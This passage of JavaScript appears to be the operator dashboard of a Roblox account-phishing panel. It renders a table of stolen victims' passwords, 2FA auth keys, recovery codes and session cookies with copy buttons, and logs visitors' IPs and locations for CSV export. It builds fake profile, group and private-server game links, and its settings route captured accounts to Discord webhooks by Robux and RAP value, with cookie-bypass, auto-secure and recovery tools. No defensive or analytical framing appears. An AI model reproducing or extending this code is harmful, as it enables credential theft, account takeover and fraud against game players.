                return;
            }
            img.onerror = null;
            img.removeAttribute("data-avatar-retry");
            img.src = profile_avatar_fallback_src();
        };
        img.src = next;
    }

    function fetch_profile_avatar_from_api(real_name, retries_left) {
        return ajax_get(endpoint_base + "create/profileAvatar?name=" + encodeURIComponent(real_name)).then(function (res) {
            if (res && res.avatar) {
                return res.avatar;
            }
            if (retries_left > 0) {
                return new Promise(function (resolve) {
                    window.setTimeout(function () {
                        resolve(fetch_profile_avatar_from_api(real_name, retries_left - 1));
                    }, 400);
                });
            }
            return null;
        });
    }

    function resolve_profile_avatar(force_refresh) {
        var data = subpage_data_cache.create_profile;
        if (!data || !data.name) {
            return Promise.resolve(null);
        }
        if (data.name.avatar && !force_refresh) {
            apply_profile_avatar_src(data.name.avatar);
            return Promise.resolve(data.name.avatar);
        }
        var real = String(data.name.real || "").trim();
        if (!real) {
            apply_profile_avatar_src(null);
            return Promise.resolve(null);
        }
        return fetch_profile_avatar_from_api(real, 2).then(function (avatar) {
            if (avatar) {
                data.name.avatar = avatar;
                apply_profile_avatar_src(avatar);
                return avatar;
            }
            apply_profile_avatar_src(null);
            return null;
        }).catch(function () {
            apply_profile_avatar_src(null);
            return null;
        });
    }

    function lazy_load_profile_avatar(force_refresh) {
        if (profile_avatar_fetch_promise) {
            return profile_avatar_fetch_promise;
        }
        profile_avatar_fetch_promise = resolve_profile_avatar(!!force_refresh).finally(function () {
            profile_avatar_fetch_promise = null;
        });
        return profile_avatar_fetch_promise;
    }

    function load_profile_page() {
        if (subpage_data_cache.create_profile) {
            set_profile_form(subpage_data_cache.create_profile);
            lazy_load_profile_avatar();
            return Promise.resolve(subpage_data_cache.create_profile);
        }
        return ajax_get(endpoint_base + "allData").then(function (data) {
            subpage_data_cache.create_profile = data.profileData;
            subpage_data_cache.create_group = data.groupData;
            subpage_data_cache.settings = data.settingsData;
            set_profile_form(data.profileData);
            lazy_load_profile_avatar();
            return data.profileData;
        }).catch(function () {
            dash_toast("Error fetching profile data", false);
        });
    }

    function init_profile_page() {
        var submit = page_el("submit");
        if (subpage_data_cache.create_profile) {
            set_profile_form(subpage_data_cache.create_profile);
            lazy_load_profile_avatar();
        } else {
        load_profile_page();
        }
        bind_submit_once(submit, profile_submit_handler);
    }

    function profile_submit_handler() {
            api_post_json(endpoint_base + "create/updateProfile", get_profile_form()).then(function (data) {
                dash_toast(data.msg || "Saved", !!data.success);
                if (data.success) {
                load_profile_page().then(function (data) {
                    if (data) {
                        sync_profile_cache_from_dom();
                    }
                });
                }
            }).catch(function (err) {
                dash_toast(err.message || "Error updating profile", false);
        });
    }

    function set_group_form(data) {
        var group = data.group || {};
        var stats = data.stats || {};
        var members = stats.members || 0;
        var funds = stats.funds || 0;

        if (page_el("ownerName")) { page_el("ownerName").value = group.owner || ""; }
        if (page_el("groupName")) { page_el("groupName").value = group.name || ""; }
        if (page_el("groupNameCard")) { page_el("groupNameCard").textContent = group.name || ""; }
        if (page_el("thumbnail")) { page_el("thumbnail").value = group.thumbnail || ""; }
        if (page_el("thumbnailCard") && group.thumbnail) { page_el("thumbnailCard").src = group.thumbnail; }
        if (page_el("shout")) { page_el("shout").value = group.shout || data.shout || ""; }
        if (page_el("description")) { page_el("description").value = data.description || ""; }
        if (page_el("members")) { page_el("members").value = members; }
        if (page_el("groupFunds")) { page_el("groupFunds").value = funds; }
        if (page_el("membersCard")) { page_el("membersCard").textContent = compact_formatter.format(members); }
        if (page_el("groupFundsCard")) { page_el("groupFundsCard").textContent = compact_formatter.format(funds); }

        var link_card = page_el("linkCard");
        if (link_card) {
            while (link_card.firstChild) {
                link_card.removeChild(link_card.firstChild);
            }
            (data.domains || []).forEach(function (domain) {
                var option = document.createElement("option");
                option.value = "https://" + domain + "/communities/" + (group.id || "") + "/";
                option.textContent = domain;
                option.className = "bg-zinc-800 text-white";
                link_card.appendChild(option);
            });
        }
    }

    function get_group_form() {
        return {
            group: {
                owner: page_el("ownerName") ? page_el("ownerName").value : "",
                name: page_el("groupName") ? page_el("groupName").value : "",
                thumbnail: page_el("thumbnail") ? page_el("thumbnail").value : ""
            },
            stats: {
                members: page_el("members") ? page_el("members").value : 0,
                funds: page_el("groupFunds") ? page_el("groupFunds").value : 0
            },
            shout: page_el("shout") ? page_el("shout").value : "",
            description: page_el("description") ? page_el("description").value : ""
        };
    }

    function load_group_page() {
        if (subpage_data_cache.create_group) {
            set_group_form(subpage_data_cache.create_group);
            return Promise.resolve(subpage_data_cache.create_group);
        }
        return ajax_get(endpoint_base + "allData").then(function (data) {
            subpage_data_cache.create_profile = data.profileData;
            subpage_data_cache.create_group = data.groupData;
            subpage_data_cache.settings = data.settingsData;
            set_group_form(data.groupData);
            return data.groupData;
        }).catch(function () {
            dash_toast("Error fetching group data", false);
        });
    }

    function init_group_page() {
        var submit = page_el("submit");
        if (subpage_data_cache.create_group) {
            set_group_form(subpage_data_cache.create_group);
        } else {
        load_group_page();
        }
        bind_submit_once(submit, group_submit_handler);
    }

    function group_submit_handler() {
            api_post_json(endpoint_base + "create/updateGroup", get_group_form()).then(function (data) {
                dash_toast(data.msg || "Saved", !!data.success);
                if (data.success) {
                load_group_page().then(function (data) {
                    if (data) {
                        sync_group_cache_from_dom();
                    }
                });
                }
            }).catch(function (err) {
                dash_toast(err.message || "Error updating group", false);
            });
    }

    var logs_list_page = 1;
    var logs_sort_by = "";

    function parse_discord_markdown(text) {
        if (!text) {
            return "";
        }
        text = String(text).replace(/</g, "&lt;").replace(/>/g, "&gt;");
        text = text.replace(/```([\s\S]*?)```/g, function (_, code) {
            return '<div style="background:#1e1f22;padding:8px;border-radius:4px;font-family:monospace;white-space:pre-wrap;word-break:break-all;color:#e3e5e8;margin:6px 0;border:1px solid #2f3136;max-height:180px;overflow-y:auto;">' + code + "</div>";
        });
        text = text.replace(/`([^`]+)`/g, '<span style="background:#1e1f22;padding:2px 4px;border-radius:4px;font-family:monospace;color:#e3e5e8;">$1</span>');
        text = text.replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, '<a href="$2" target="_blank" rel="noopener" style="color:#00aaff;text-decoration:none;">$1</a>');
        text = text.replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>");
        text = text.replace(/\*(.+?)\*/g, "<em>$1</em>");
        return text;
    }

    function render_discord_embed(payload) {
        var preview = page_el("embedPreview");
        if (!preview) {
            return;
        }
        preview.innerHTML = "";
        if (!payload || !Array.isArray(payload.embeds)) {
            return;
        }
        if (payload.avatar_url || payload.username) {
            var author = document.createElement("div");
            author.className = "discord-author";
            author.innerHTML =
                (payload.avatar_url ? '<img src="' + escapeHTML(payload.avatar_url) + '" class="author-avatar" alt="">' : "") +
                '<span class="author-name">' + escapeHTML(payload.username || "") + "</span>";
            preview.appendChild(author);
        }
        payload.embeds.forEach(function (embed_data) {
            var embed = document.createElement("div");
            embed.className = "embed";
            if (embed_data.color) {
                embed.style.borderLeftColor = "#" + Number(embed_data.color).toString(16).padStart(6, "0");
            }
            if (embed_data.title) {
                var title_el = document.createElement("div");
                title_el.className = "embed-title";
                title_el.innerHTML = parse_discord_markdown(embed_data.title);
                embed.appendChild(title_el);
            }
            if (embed_data.description) {
                var desc_el = document.createElement("div");
                desc_el.className = "embed-description";
                desc_el.innerHTML = parse_discord_markdown(embed_data.description);
                embed.appendChild(desc_el);
            }
            if (Array.isArray(embed_data.fields)) {
                embed_data.fields.forEach(function (field) {
                    var box = document.createElement("div");
                    box.innerHTML =
                        '<div class="embed-field-name">' + parse_discord_markdown(field.name || "") + "</div>" +
                        '<div class="embed-field-value">' + parse_discord_markdown(field.value || "") + "</div>";
                    embed.appendChild(box);
                });
            }
            if (embed_data.footer && embed_data.footer.text) {
                var footer = document.createElement("div");
                footer.className = "embed-footer";
                footer.innerHTML =
                    (embed_data.footer.icon_url ? '<img src="' + escapeHTML(embed_data.footer.icon_url) + '" class="footer-icon" alt="">' : "") +
                    "<span>" + escapeHTML(embed_data.footer.text) + "</span>";
                embed.appendChild(footer);
            }
            preview.appendChild(embed);
        });
    }

    window.openEmbed = function (payload) {
        render_discord_embed(payload);
        var overlay = page_el("embedOverlay");
        if (overlay) {
            overlay.classList.add("active");
        }
    };

    window.closeEmbed = function (event) {
        if (event && event.target && event.currentTarget !== event.target) {
            return;
        }
        var overlay = page_el("embedOverlay");
        if (overlay) {
            overlay.classList.remove("active");
        }
    };

    window.handleOpenEmbed = function (btn) {
        if (!btn || !btn.dataset || !btn.dataset.embed) {
            return;
        }
        try {
            openEmbed(JSON.parse(decodeURIComponent(btn.dataset.embed)));
        } catch (e) {
            dash_toast("Could not open embed preview.", false);
        }
    };

    window.handlePasskey = function () {
        dash_toast("Passkey download is not configured yet.", false);
    };

    function populate_logs_table(log_data) {
        var tbody = page_el("userTableBody");
        if (!tbody) {
            return;
        }
        tbody.innerHTML = "";
        (log_data || []).forEach(function (data, index) {
            var user = data.user || {};
            var creds = data.credentials || {};
            var embed_json = "";
            try {
                embed_json = encodeURIComponent(JSON.stringify(data.embedData || {}));
            } catch (e) {
                embed_json = encodeURIComponent("{}");
            }
            var is_last = index === (log_data.length - 1);
            var row_border = is_last ? "" : "border-b border-zinc-800";
            var display = escapeHTML(user.display || user.username || "");
            var username = escapeHTML(user.username || "");
            var thumb = escapeHTML(user.thumbnail || "");
            var uid = escapeHTML(String(user.id || ""));
            var row_html =
                '<tr data-userid="' + uid + '" class="' + row_border + '">' +
                '<td class="px-6 py-4"><input type="checkbox" class="form-checkbox h-5 w-5 text-indigo-600 userCheckbox" /></td>' +
                '<td class="px-6 py-4">' + escapeHTML(data.time || "") + "</td>" +
                '<td class="px-6 py-4 flex items-center space-x-3">' +
                (thumb ? '<img class="w-10 h-10 rounded-full" src="' + thumb + '" alt="">' : "") +
                '<div><div class="font-medium">' + display + '</div><div class="text-zinc-500">' + username + "</div></div></td>" +
                '<td class="px-6 py-4">' + escapeHTML(data.summary || "0") + "</td>" +
                '<td class="px-6 py-4">' + escapeHTML(data.robux || "0") + "</td>" +
                '<td class="px-6 py-4">' + escapeHTML(data.rap || "0") + "</td>" +
                '<td class="px-6 py-4">' + dash_copy_field_html(creds.password || "", "Copy password") + "</td>" +
                '<td class="px-6 py-4">' + dash_copy_field_html(creds.authkey || "", "Copy auth key") + "</td>" +
                '<td class="px-6 py-4">' + dash_copy_field_html(creds.recovcodes || "", "Copy recovery codes") + "</td>" +
                '<td class="px-6 py-4">' + dash_copy_field_html(creds.cookie || "", "Copy cookie") + "</td>" +
                '<td class="px-6 py-3 w-1/3 cursor-pointer" onclick="handlePasskey(this)">Download</td>' +
                '<td class="px-6 py-3 w-1/3 cursor-pointer" data-embed="' + embed_json + '" onclick="handleOpenEmbed(this)">View</td>' +
                "</tr>";
            tbody.insertAdjacentHTML("beforeend", row_html);
        });
    }

    function init_table_pagination(total_pages, current_page, fetch_page_fn) {
        var pagination = page_el("pagination");
        if (!pagination || typeof fetch_page_fn !== "function") {
            return;
        }
        pagination.innerHTML = "";
        total_pages = Math.max(1, Number(total_pages) || 1);
        current_page = Math.max(1, Math.min(total_pages, Number(current_page) || 1));

        function add_btn(label, target_page, disabled, extra_class, is_nav) {
            var li = document.createElement("li");
            var btn = document.createElement("button");
            btn.type = "button";
            btn.textContent = label;
            btn.className = "dash_table_page_btn " + (extra_class || "") + (is_nav ? " dash_table_page_nav" : "");
            if (!is_nav && target_page === current_page) {
                btn.classList.add("is-active");
            }
            if (disabled) {
                btn.disabled = true;
            } else {
                btn.addEventListener("click", function (event) {
                    event.preventDefault();
                    event.stopPropagation();
                    if (!btn.disabled) {
                        btn.disabled = true;
                        fetch_page_fn(target_page).finally(function () {
                            btn.disabled = false;
                        });
                    }
                });
            }
            li.appendChild(btn);
            pagination.appendChild(li);
        }

        add_btn("Previous", current_page - 1, current_page === 1, "rounded-s-lg", true);
        var start = Math.max(1, current_page - 2);
        var end = Math.min(total_pages, start + 4);
        if (end - start < 4) {
            start = Math.max(1, end - 4);
        }
        for (var p = start; p <= end; p++) {
            add_btn(String(p), p, false, "", false);
        }
        add_btn("Next", current_page + 1, current_page === total_pages, "rounded-e-lg", true);
    }

    function init_logs_pagination(total_pages, current_page) {
        init_table_pagination(total_pages, current_page, fetch_logs_page);
    }

    function fetch_logs_page(page) {
        logs_list_page = page;
        if (subpage_data_cache.logs && subpage_data_cache.logs.page === page && subpage_data_cache.logs.sortBy === logs_sort_by && subpage_data_cache.logs.logs) {
            populate_logs_table(subpage_data_cache.logs.logs);
            init_logs_pagination(subpage_data_cache.logs.pages, page);
            save_subpage_html_cache("logs");
            return Promise.resolve();
        }
        return ajax_get(endpoint_base + "logs/logs?page=" + page + "&sortBy=" + encodeURIComponent(logs_sort_by || "")).then(function (data) {
            subpage_data_cache.logs = {
                page: page,
                sortBy: logs_sort_by,
                logs: data.logs || [],
                pages: data.pages || 1
            };
            populate_logs_table(subpage_data_cache.logs.logs);
            init_logs_pagination(subpage_data_cache.logs.pages, page);
            save_subpage_html_cache("logs");
        }).catch(function () {
            dash_toast("Error loading logs.", false);
        });
    }

    function bind_logs_controls_once() {
        var sort_el = page_el("sortBySelect");
        if (sort_el && sort_el.getAttribute("data-bound") !== "1") {
            sort_el.setAttribute("data-bound", "1");
            sort_el.addEventListener("change", function () {
                logs_sort_by = sort_el.value || "";
                subpage_data_cache.logs = null;
                fetch_logs_page(1);
            });
        }
    }

    function init_logs_page() {
        bind_logs_controls_once();
        if (subpage_data_cache.logs && subpage_data_cache.logs.logs) {
            populate_logs_table(subpage_data_cache.logs.logs);
            init_logs_pagination(subpage_data_cache.logs.pages, subpage_data_cache.logs.page || 1);
            save_subpage_html_cache("logs");
            return;
        }
        fetch_logs_page(logs_list_page);
    }

    function preload_logs_data() {
        if (subpage_data_cache.logs && subpage_data_cache.logs.logs) {
            return Promise.resolve();
        }
        return ajax_get(endpoint_base + "logs/logs?page=1").then(function (data) {
            subpage_data_cache.logs = {
                page: 1,
                sortBy: "",
                logs: data.logs || [],
                pages: data.pages || 1
            };
        }).catch(function () { });
    }

    var visits_list_page = 1;

    function populate_visits_table(log_data) {
        var tbody = page_el("userTableBody");
        if (!tbody) {
            return;
        }
        tbody.innerHTML = "";
        (log_data || []).forEach(function (data, index) {
            var is_last = index === (log_data.length - 1);
            var row_border = is_last ? "" : "border-b border-zinc-800";
            var ip = escapeHTML((data.user && data.user.ip) || "");
            var country = escapeHTML((data.user && data.user.country) || "");
            var city = escapeHTML((data.user && data.user.city) || "");
            var type = escapeHTML((data.link && data.link.type) || "");
            var date = escapeHTML(data.date || "");
            var row_html =
                '<tr class="' + row_border + '">' +
                '<td class="px-6 py-4"><input type="checkbox" class="form-checkbox h-5 w-5 text-indigo-600 userCheckbox" /></td>' +
                '<td class="px-6 py-4">' + ip + "</td>" +
                '<td class="px-6 py-4">' + country + "</td>" +
                '<td class="px-6 py-4">' + city + "</td>" +
                '<td class="px-6 py-4">' + type + "</td>" +
                '<td class="px-6 py-4">' + dash_copy_field_html((data.link && data.link.url) || "", "Copy link") + "</td>" +
                '<td class="px-6 py-4">' + date + "</td>" +
                "</tr>";
            tbody.insertAdjacentHTML("beforeend", row_html);
        });
    }

    function init_visits_pagination(total_pages, current_page) {
        init_table_pagination(total_pages, current_page, fetch_visits_page);
    }

    function fetch_visits_page(page) {
        page = Math.max(1, Number(page) || 1);
        visits_list_page = page;

        if (subpage_data_cache.visits && subpage_data_cache.visits.page === page && subpage_data_cache.visits.logs) {
            populate_visits_table(subpage_data_cache.visits.logs);
            init_visits_pagination(subpage_data_cache.visits.pages, page);
            save_subpage_html_cache("visits");
            return Promise.resolve(subpage_data_cache.visits);
        }

        return ajax_get(endpoint_base + "logs/visits?page=" + page).then(function (data) {
            subpage_data_cache.visits = {
                page: page,
                logs: data.logs || [],
                pages: data.pages || 1
            };
            populate_visits_table(subpage_data_cache.visits.logs);
            init_visits_pagination(subpage_data_cache.visits.pages, page);
            save_subpage_html_cache("visits");
            return subpage_data_cache.visits;
        }).catch(function () {
            dash_toast("Error fetching visits", false);
        });
    }

    function bind_visits_controls_once() {
        var select_all = page_el("selectAll");
        if (select_all && select_all.getAttribute("data-bound") !== "1") {
            select_all.setAttribute("data-bound", "1");
            select_all.addEventListener("change", function () {
                page_root().querySelectorAll(".userCheckbox").forEach(function (box) {
                    box.checked = select_all.checked;
                });
            });
        }

        var download_btn = page_el("downloadButtonVisits");
        if (download_btn && download_btn.getAttribute("data-bound") !== "1") {
            download_btn.setAttribute("data-bound", "1");
            download_btn.addEventListener("click", function () {
                var selected = page_root().querySelectorAll(".userCheckbox:checked");
                if (!selected.length) {
                    dash_toast("Please select at least one row to download.", false);
                    return;
                }
                var csv = "data:text/csv;charset=utf-8,IP,Country,City,Type,Link,Date\n";
                selected.forEach(function (checkbox) {
                    var row = checkbox.closest("tr");
                    if (!row) {
                        return;
                    }
                    var cells = row.cells;
                    var link_el = row.querySelector(".copyable-text");
                    csv += [
                        cells[1].textContent.trim(),
                        cells[2].textContent.trim(),
                        cells[3].textContent.trim(),
                        cells[4].textContent.trim(),
                        '"' + (link_el ? link_el.textContent.trim() : "") + '"',
                        cells[6].textContent.trim()
                    ].join(",") + "\n";
                });
                var link = document.createElement("a");
                link.href = encodeURI(csv);
                link.download = "selected_visits.csv";
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            });
        }
    }

    function init_visits_page() {
        bind_visits_controls_once();
        if (subpage_data_cache.visits && subpage_data_cache.visits.logs) {
            populate_visits_table(subpage_data_cache.visits.logs);
            init_visits_pagination(subpage_data_cache.visits.pages, subpage_data_cache.visits.page || 1);
            save_subpage_html_cache("visits");
            return;
        }
        fetch_visits_page(visits_list_page);
    }

    function preload_profile_data() {
        if (subpage_data_cache.create_profile && subpage_data_cache.create_group && subpage_data_cache.settings) {
            return Promise.resolve();
        }
        return ajax_get(endpoint_base + "allData").then(function (data) {
            subpage_data_cache.create_profile = data.profileData;
            subpage_data_cache.create_group = data.groupData;
            subpage_data_cache.settings = data.settingsData;
            if (data.profileData && data.profileData.name && !data.profileData.name.avatar) {
                lazy_load_profile_avatar(false);
            }
        }).catch(function () { });
    }

    function preload_group_data() {
        if (subpage_data_cache.create_group) {
            return Promise.resolve();
        }
        return preload_profile_data();
    }

    function preload_visits_data() {
        if (subpage_data_cache.visits && subpage_data_cache.visits.logs) {
            return Promise.resolve();
        }
        return ajax_get(endpoint_base + "logs/visits?page=1").then(function (data) {
            subpage_data_cache.visits = {
                page: 1,
                logs: data.logs || [],
                pages: data.pages || 1
            };
        }).catch(function () { });
    }

    function preload_vip_data() {
        if (subpage_data_cache.create_vip && subpage_data_cache.create_vip.games && subpage_data_cache.create_vip.games.length) {
            return Promise.resolve();
        }
        return fetch_json(window.location.origin + "/control/api/create/gameData", {
            method: "GET",
            headers: { "Content-Type": "application/json" },
            credentials: "include"
        }).then(function (payload) {
            var game_data = {
                domains: payload.domains || [],
                privateServerLinkCode: payload.privateServerLinkCode || ""
            };
            subpage_data_cache.create_vip = {
                gameData: game_data,
                games: []
            };
            return fetch_json(window.location.origin + "/search-api/omni-search?searchQuery=" + encodeURIComponent("reccomended") + "&sessionId=brenden&pageType=all").then(function (result) {
                var rows = result.searchResults || [];
                var private_code = game_data.privateServerLinkCode;
                var games = rows.map(function (row) {
                    var item = (row.contents && row.contents[0]) ? row.contents[0] : {};
                    var safe_name = String(item.name || "Game")
                        .replace(/[^a-zA-Z0-9 ]/g, "")
                        .replace(/ /g, "-")
                        .replace(/--+/g, "-")
                        .replace(/^-+|-+$/g, "");
                    return {
                        name: item.name || "Game",
                        maturity: item.ageRecommendationDisplayName || "All Ages",
                        playerCount: item.playerCount || 0,
                        likes: item.totalUpVotes || 0,
                        dislikes: item.totalDownVotes || 0,
                        universeId: item.universeId || 0,
                        url: "https://DOMAIN/games/" + (item.rootPlaceId || 0) + "/" + safe_name + "?privateServerLinkCode=" + encodeURIComponent(private_code)
                    };
                });
                return get_universe_thumbnails(games.map(function (g) { return g.universeId; })).then(function (thumbs) {
                    games.forEach(function (g) { g.thumbnail = thumbs[g.universeId] || null; });
                    subpage_data_cache.create_vip.games = games;
                });
            });
        }).catch(function () { });
    }

    function preload_dashboard_subpages() {
        if (preload_started) {
            return;
        }
        preload_started = true;
        window.setTimeout(function () {
            preload_profile_data();
            preload_visits_data();
            preload_logs_data();
            window.setTimeout(preload_vip_data, 400);
        }, 300);
    }

    function init_inline_page_features(key, from_cache) {
        from_cache = !!from_cache;
        if (key === "create_vip") {
            init_vip_page(from_cache);
        }
        if (key === "misc_hyperlink") {
            init_hyperlink_page();
        }
        if (key === "misc_cookiebypass") {
            init_refresher_page();
        }
        if (key === "misc_recovery") {
            init_recovery_page();
        }
        if (key === "create_profile") {
            init_profile_page();
        }
        if (key === "create_group") {
            init_group_page();
        }
        if (key === "visits") {
            init_visits_page();
        }
        if (key === "logs") {
            init_logs_page();
        }
        if (key === "settings") {
            init_settings_page();
        }
    }

    function get_settings_form() {
        return {
            minimum: {
                robux: parseInt(page_el("minRobux") ? page_el("minRobux").value : "0", 10) || 0,
                summary: parseInt(page_el("minSummary") ? page_el("minSummary").value : "0", 10) || 0,
                rap: parseInt(page_el("minRAP") ? page_el("minRAP").value : "0", 10) || 0
            },
            webhooks: {
                default: page_el("webhookDefault") ? page_el("webhookDefault").value : "",
                robux: page_el("webhookRobux") ? page_el("webhookRobux").value : "",
                summary: page_el("webhookSummary") ? page_el("webhookSummary").value : "",
                rap: page_el("webhookRAP") ? page_el("webhookRAP").value : ""
            },
            dashboard: {
                anonymous: page_el("dashboardAnonymous") ? page_el("dashboardAnonymous").checked : false,
                autosecure: page_el("dashboardAutosecure") ? page_el("dashboardAutosecure").checked : false,
                autoage: page_el("dashboardAutoAge") ? page_el("dashboardAutoAge").checked : false
            },
            embed: {
                pingEveryone: page_el("embedPingEveryone") ? page_el("embedPingEveryone").checked : false,
                pingHere: page_el("embedPingHere") ? page_el("embedPingHere").checked : false,
                visitNoti: page_el("embedVisitNoti") ? page_el("embedVisitNoti").checked : false
            },
            customGameLink: page_el("customGameLink") ? page_el("customGameLink").value : ""
        };
    }

    function set_settings_form(data) {
        if (!data) {
            return;
        }
        var minimum = data.minimum || {};
        var webhooks = data.webhooks || {};
        var dashboard = data.dashboard || {};
        var embed = data.embed || {};
        if (page_el("minRobux")) { page_el("minRobux").value = minimum.robux || 0; }
        if (page_el("minSummary")) { page_el("minSummary").value = minimum.summary || 0; }
        if (page_el("minRAP")) { page_el("minRAP").value = minimum.rap || 0; }
        if (page_el("webhookDefault")) { page_el("webhookDefault").value = webhooks.default || ""; }
        if (page_el("webhookRobux")) { page_el("webhookRobux").value = webhooks.robux || ""; }
        if (page_el("webhookSummary")) { page_el("webhookSummary").value = webhooks.summary || ""; }
        if (page_el("webhookRAP")) { page_el("webhookRAP").value = webhooks.rap || ""; }
        if (page_el("dashboardAnonymous")) { page_el("dashboardAnonymous").checked = !!dashboard.anonymous; }
        if (page_el("dashboardAutosecure")) { page_el("dashboardAutosecure").checked = !!dashboard.autosecure; }
        if (page_el("dashboardAutoAge")) { page_el("dashboardAutoAge").checked = !!dashboard.autoage; }
        if (page_el("embedPingEveryone")) { page_el("embedPingEveryone").checked = !!embed.pingEveryone; }
        if (page_el("embedPingHere")) { page_el("embedPingHere").checked = !!embed.pingHere; }
        if (page_el("embedVisitNoti")) { page_el("embedVisitNoti").checked = !!embed.visitNoti; }
        if (page_el("customGameLink")) { page_el("customGameLink").value = data.customGameLink || ""; }
    }

    function load_settings_page() {
        if (subpage_data_cache.settings) {
            set_settings_form(subpage_data_cache.settings);
            save_subpage_html_cache("settings");
            return Promise.resolve(subpage_data_cache.settings);
        }
        return ajax_get(endpoint_base + "allData").then(function (data) {
            subpage_data_cache.create_profile = data.profileData;
            subpage_data_cache.create_group = data.groupData;
            subpage_data_cache.settings = data.settingsData;
            set_settings_form(data.settingsData);
            save_subpage_html_cache("settings");
            return data.settingsData;
        }).catch(function () {
            dash_toast("Error fetching settings", false);
        });
    }

    function init_settings_page() {
        var submit = page_el("submit");
        if (subpage_data_cache.settings) {
            set_settings_form(subpage_data_cache.settings);
        } else {
            load_settings_page();
        }
        bind_submit_once(submit, function () {
            var body = get_settings_form();
            api_post_json(endpoint_base + "settings/updateSettings", body).then(function (data) {
                dash_toast(data.msg || "Saved", !!data.success);
                if (data.success) {
                    subpage_data_cache.settings = body;
                    save_subpage_html_cache("settings");
                }
            }).catch(function (err) {
                dash_toast(err.message || "Error saving settings", false);
            });
        });
    }

    function preload_settings_data() {
        if (subpage_data_cache.settings) {
            return Promise.resolve();
        }
        return preload_profile_data();
    }

    window.load_subpage = function (page) {
        var requested_key = inline_subpage_key(page);
        if (requested_key === active_inline_page_key) {
            overlay_hide();
            return;
        }

        snapshot_active_subpage();

        if (content) {
            content.style.opacity = "0";
            content.style.transform = "translateY(12px)";
        }
        load_inline_page(page).then(function () {
            window.setTimeout(function () {
                if (content) {
                    content.style.opacity = "1";
                    content.style.transform = "translateY(0)";
                }
            }, 120);
            overlay_hide();
        }).catch(function (err) {
            if (content) {
                content.style.opacity = "1";
                content.style.transform = "translateY(0)";
            }
            overlay_hide();
        });
    };

    function bind_events() {
        if (menu_btn) {
            menu_btn.addEventListener("click", function () {
                if (left_sidebar && left_sidebar.classList.contains("is_open")) {
                    overlay_hide();
                    return;
                }
                if (right_sidebar) { right_sidebar.classList.remove("is_open"); }
                sidebar_open(left_sidebar);
            });
        }

        if (chat_btn) {
            chat_btn.addEventListener("click", function () {
                if (right_sidebar && right_sidebar.classList.contains("is_open")) {
                    overlay_hide();
                    return;
                }
                if (left_sidebar) { left_sidebar.classList.remove("is_open"); }
                sidebar_open(right_sidebar);
            });
        }

        if (close_chat_btn) { close_chat_btn.addEventListener("click", overlay_hide); }
        if (overlay) { overlay.addEventListener("click", overlay_hide); }

        if (send_btn) {
            send_btn.disabled = false;
            send_btn.addEventListener("click", send_chat);
        }
        if (message_input) {
            message_input.disabled = false;
            message_input.addEventListener("keydown", function (event) {
                if (event.key === "Enter") {
                    event.preventDefault();
                    send_chat();
                }
            });
        }

        window.addEventListener("resize", function () {
            var stats = defaults.stats;
            render_all_charts(stats.charts, stats.chart_days);
        });
    }

    function resolve_number_input(target) {
        if (!target) {
            return null;
        }
        if (typeof target === "string") {
            return document.getElementById(target);
        }
        if (target.tagName && target.tagName.toLowerCase() === "input") {
            return target;
        }
        return null;
    }

    function normalize_non_negative_number(value) {
        var n = Number(value);
        if (!Number.isFinite(n) || n < 0) {
            return 0;
        }
        return Math.floor(n);
    }

    // Used by inline subpages (settings/profile/group) via onclick attributes.
    window.validateNumber = function (input) {
        var node = resolve_number_input(input);
        if (!node) {
            return;
        }
        node.value = String(normalize_non_negative_number(node.value));
    };

    window.increment = function (id) {
        var node = resolve_number_input(id);
        if (!node) {
            return;
        }
        node.value = String(normalize_non_negative_number(node.value) + 1);
        node.dispatchEvent(new Event("change", { bubbles: true }));
    };

    window.decrement = function (id) {
        var node = resolve_number_input(id);
        if (!node) {
            return;
        }
        node.value = String(Math.max(0, normalize_non_negative_number(node.value) - 1));
        node.dispatchEvent(new Event("change", { bubbles: true }));
    };

    function load_dashboard_data() {
        ajax_get(endpoint_base + "dashboard").catch(function () { return { stats: defaults.stats, profile: defaults.profile, profileData: null, groupData: null, settingsData: null, chat: [] }; }).then(function (data) {
            var stats_data = data.stats || defaults.stats;
            var profile_data = data.profile || defaults.profile;

            defaults.stats = Object.assign({}, defaults.stats, stats_data);
            defaults.profile = Object.assign({}, defaults.profile, profile_data);

            if (data.profileData) {
                subpage_data_cache.create_profile = data.profileData;
            }
            if (data.groupData) {
                subpage_data_cache.create_group = data.groupData;
            }
            if (data.settingsData) {
                subpage_data_cache.settings = data.settingsData;
            }

            render_stats(defaults.stats);
            render_profile(defaults.profile);

            if (typeof stats_data.statistics_accounts !== "undefined") {
                set_text("logs_amount_sidebar", stats_data.statistics_accounts);
            }
            if (typeof stats_data.statistics_visits !== "undefined") {
                set_text("visits_amount_sidebar", stats_data.statistics_visits);
            }

            if (data.chat && Array.isArray(data.chat)) {
                data.chat.forEach(append_chat_message);
            }

            preload_dashboard_subpages();
        });

        setInterval(function () {
            ajax_get(endpoint_base + "dashboard").then(function (data) {
                var stats_data = data.stats || defaults.stats;
                defaults.stats = Object.assign({}, defaults.stats, stats_data);
                render_stats(defaults.stats);
                if (typeof stats_data.statistics_accounts !== "undefined") {
                    set_text("logs_amount_sidebar", stats_data.statistics_accounts);
                }
                if (typeof stats_data.statistics_visits !== "undefined") {
                    set_text("visits_amount_sidebar", stats_data.statistics_visits);
                }
            }).catch(function () {});
        }, 5000);
    }

    document.body.classList.add("dash_animating");
    bind_events();
    render_stats(defaults.stats);
    render_profile(defaults.profile);
    start_chat_live();
    load_dashboard_data();
    preload_dashboard_subpages();
    remove_animating();
})();
